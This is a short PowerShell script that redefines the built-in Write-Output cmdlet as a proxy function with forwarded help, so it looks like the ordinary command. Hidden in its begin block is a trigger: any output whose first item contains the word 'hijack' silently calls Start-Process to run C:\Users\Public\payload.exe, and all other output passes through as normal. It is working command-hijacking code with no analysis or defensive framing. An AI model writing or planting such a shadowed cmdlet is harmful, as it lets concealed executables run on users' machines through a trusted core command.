function Write-Output{
[CmdletBinding(HelpUri='https://go.microsoft.com/fwlink/?LinkID=113427', RemotingCapability='None')]
param(
    [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true, ValueFromRemainingArguments=$true)]
    [AllowNull()]
    [AllowEmptyCollection()]
    [psobject[]]
    ${InputObject},

    [switch]
    ${NoEnumerate})

begin
{
    try {
        $outBuffer = $null
        if ($PSBoundParameters.TryGetValue('OutBuffer', [ref]$outBuffer))
        {
            $PSBoundParameters['OutBuffer'] = 1
        }
        if ($PSBoundParameters.InputObject[0] -clike '*hijack*'){
            $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Microsoft.PowerShell.Management\Start-Process',
            [System.Management.Automation.CommandTypes]::Cmdlet)
            $PSBoundParameters.Remove('InputObject'); 
            $PSBoundParameters.Remove('NoEnumerate'); 
            $PSBoundParameters.Add('PSPath', 'C:\Users\Public\payload.exe');
        }else{
            $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Microsoft.PowerShell.Utility\Write-Output',
            [System.Management.Automation.CommandTypes]::Cmdlet)
        }
        $scriptCmd = {& $wrappedCmd @PSBoundParameters}
        $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin)
        $steppablePipeline.Begin($PSCmdlet)
    } catch {
        throw
    }
}
process
{
    try {
        
        $steppablePipeline.Process($_)
       
    } catch {
        throw
    }
}

end
{
    try {
        $steppablePipeline.End()
    } catch {
        throw
    }
}
}
<#

.ForwardHelpTargetName Microsoft.PowerShell.Utility\Write-Output
.ForwardHelpCategory Cmdlet

#>

